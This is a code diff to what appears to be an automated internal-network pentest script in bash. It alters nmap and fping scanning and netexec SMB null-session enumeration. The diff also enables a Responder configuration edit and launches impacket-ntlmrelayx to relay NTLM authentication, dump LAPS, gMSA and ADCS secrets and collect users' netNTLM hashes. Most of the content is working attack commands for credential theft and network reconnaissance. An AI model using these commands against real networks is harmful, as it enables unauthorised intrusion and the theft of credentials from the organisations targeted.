@@ -210,7 +210,7 @@ nmap_fast () {
 				grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' $DIR/tmp_hosts.txt >> $DIR/hosts.txt
 				rm $DIR/tmp_hosts.txt
 			else
-				fping -g $rangeIP_array_key --alive | grep -v $MY_IP >> $DIR/hosts.txt 2>/dev/null
+				fping -g $rangeIP_array_key --alive -q | grep -v $MY_IP >> $DIR/hosts.txt 2>/dev/null
     				sort -u $DIR/hosts.txt -o $DIR/hosts.txt
 			fi
 		done
@@ -237,10 +237,10 @@ nmap_fast () {
 		#Si pas proxychains, sS pour TCP
 		#ports=$(nmap -p- --min-rate=1000 -T4 $target | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//); echo "nmap -p $ports -sT -sV -T4 -R $target"; nmap -p $ports -sT -sV -T4 -R $target
 		NMAP_HOSTS="-iL $DIR/hosts.txt"
-		nmap $NMAP_HOSTS -sS -T4 -oA $DIR/scan_nmap/scan_TCP_ports --open --exclude $excluded_hosts >/dev/null 2>&1
+		nmap $NMAP_HOSTS -sT -T4 -oA $DIR/scan_nmap/scan_TCP_ports --open --exclude $excluded_hosts >/dev/null 2>&1
 		
 		ports=$(grep -oP '^\d{1,5}/(tcp|udp)' $DIR/scan_nmap/scan_TCP_ports.nmap | awk -F'/' '{print $1}' | sort -u | paste -sd, -)
-		nmap $NMAP_HOSTS -sS -sV -T4 -p $ports -oA $DIR/scan_nmap/scan_Fast_TCP --open --exclude $excluded_hosts >/dev/null 2>&1
+		nmap $NMAP_HOSTS -sT -sV -T4 -p $ports -oA $DIR/scan_nmap/scan_Fast_TCP --open --exclude $excluded_hosts >/dev/null 2>&1
 		#log "${SPACE}[!] Nmap TCP report : ${DIR}/scan_nmap/scan_Fast_TCP.nmap"
 		log "${SPACE}[📂] UDP Scanning ..."
 		#UDP
@@ -427,7 +427,7 @@ relay () {
 		if [ -z "$proxychains" ];then
 			#Turn off SMB,HTTP and HTTPS server on Responder.conf file
 			responder_file="/usr/share/responder/Responder.conf"
-			#sed -i '/^\s*SMB\s*=\s*On/s/= On/= Off/; /^\s*HTTPS\s*=\s*On/s/= On/= Off/; /^\s*HTTP\s*=\s*On/s/= On/= Off/' "$responder_file"
+			sed -i '/^\s*SMB\s*=\s*On/s/= On/= Off/; /^\s*HTTPS\s*=\s*On/s/= On/= Off/; /^\s*HTTP\s*=\s*On/s/= On/= Off/' "$responder_file"
 			#Configure proxychains port 1080 (ntlmrelayx) and dynamic_chain (to have possibility of multiples socks)
 			config_file="/etc/proxychains4.conf"
 			sed -i '/^strict_chain/s/^/#/' "$config_file"
@@ -443,13 +443,13 @@ relay () {
 				#terminator --new-tab -m -e "tail -F /root/test" &
 				terminator --new-tab -m -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -bd --wpad --disable-ess -v; sleep 5d" &
 				sleep 1
-				terminator --new-tab -m -e "source /tmp/set_title_tab.sh RelayNTLM; ntlmrelayx.py -tf $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
+				terminator --new-tab -m -e "source /tmp/set_title_tab.sh RelayNTLM; impacket-ntlmrelayx -tf $DIR_VULNS/NTLM_relay/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
 			else
 				#export QT_QPA_PLATFORM=offscreen 
 				#qterminal -e "tail -F $logfile" &
 				x-terminal-emulator -e "source /tmp/set_title_tab.sh Responder; responder -I ${INTERFACE} -bd --wpad --disable-ess -v; sleep 5d" &
 				sleep 1
-				x-terminal-emulator -e "source /tmp/set_title_tab.sh RelayNTLM; ntlmrelayx.py -tf $DIR_VULNS/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
+				x-terminal-emulator -e "source /tmp/set_title_tab.sh RelayNTLM; impacket-ntlmrelayx -tf $DIR_VULNS/ntlm-relay-list.txt -smb2support -socks --output-file $DIR_VULNS/NTLM_relay/ --dump-laps --dump-gmsa --dump-adcs; sleep 5d" &
 			fi
 			blue_log "${SPACE}[💀] NTLM Relay started, look at socks and folder $DIR_VULNS/NTLM_relay/ for user's netNTLM hashes"
 		else
@@ -1083,16 +1083,15 @@ smb () {
 				log "${SPACE}[📂] Checking $ip ($hostname) ..."
 
 				#Anonymous / null session is allowed ?
-				$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --shares > ${DIR_VULNS}/smb/cme_${ip}_null_session_shares 2>/dev/null
-				$proxychains netexec --timeout 30 smb $ip -u '' -p '' --shares > ${DIR_VULNS}/smb/cme_${ip}_null_session_users 2>/dev/null
-				if (grep -aq '\[+\]' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares" && ! grep -aq "STATUS_ACCESS_DENIED" "${DIR_VULNS}/smb/cme_${ip}_null_session_shares") || grep -aq 'badpwdcount' "${DIR_VULNS}/smb/cme_${ip}_null_session_users"; then
+				$proxychains netexec --timeout 30 smb $ip -u '' -p '' --shares > ${DIR_VULNS}/smb/cme_${ip}_null_session_shares 2>/dev/null
+				$proxychains netexec --timeout 30 smb $ip -u '' -p '' --users > ${DIR_VULNS}/smb/cme_${ip}_null_session_users 2>/dev/null
+				if (grep -aq '\[+\]' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares" && ! grep -aq "STATUS_ACCESS_DENIED" "${DIR_VULNS}/smb/cme_${ip}_null_session_shares") || grep -aiq 'BadPW' "${DIR_VULNS}/smb/cme_${ip}_null_session_users"; then
 					green_log "${SPACE}${SPACE}[💀] Null session (anonymous) allowed"
 					if grep -qaE 'READ|WRITE' "${DIR_VULNS}/smb/cme_${ip}_null_session_shares"; then
 						green_log "${SPACE}${SPACE}[💀] Shares found -> ${DIR_VULNS}/smb/cme_${ip}_null_session_shares"
 						blue_log "${SPACE}${SPACE} [+] $proxychains smbmap -H ${ip} -r --depth 3 --exclude IPC$"
 					fi
 					
-					$proxychains netexec --timeout $CME_TIMEOUT smb $ip -u '' -p '' --rid-brute 2000 < /dev/null > ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute 2>/dev/null
 					cat ${DIR_VULNS}/smb/cme_${ip}_null_session_rid_brute |grep -ai 'SidTypeUser' |grep -av '\[.\]' | grep -v "\-BadPW\-" | awk '{for(i=5;i<=NF;i++) printf $i" "; print ""}' |  \
 							sed 's/.*\\//' | awk '{print $1}' | tee -a ${DIR_VULNS}/smb/cme_${ip}_local_users.txt ${DIR}/users.txt
 					if [[ $(wc -l < "${DIR_VULNS}/smb/cme_${ip}_local_users.txt") -gt 0 ]]; then
@@ -1370,7 +1369,7 @@ web () {
 			port="${BASH_REMATCH[1]}"
    			if control_ip_attack; then
 				# Extract port number and protocol
-				if [[ "$line" =~ http|https ]] && [[ ! "$line" =~ ncacn_http ]] && [[ "$port" != "5985" && "$port" != "5357" ]]; then
+				if [[ "$line" =~ http|https ]] && [[ ! "$line" =~ ncacn_http ]] && [[ "$port" != "5985" && "$port" != "5986" && "$port" != "5357" ]]; then
 					echo $line
 					whatweb ${ip}:${port} --log-brief=/tmp/whatweb >/dev/null 2>&1
 					HTTPServer=$(cat /tmp/whatweb | grep -oP 'HTTPServer\[\K[^\]]+')
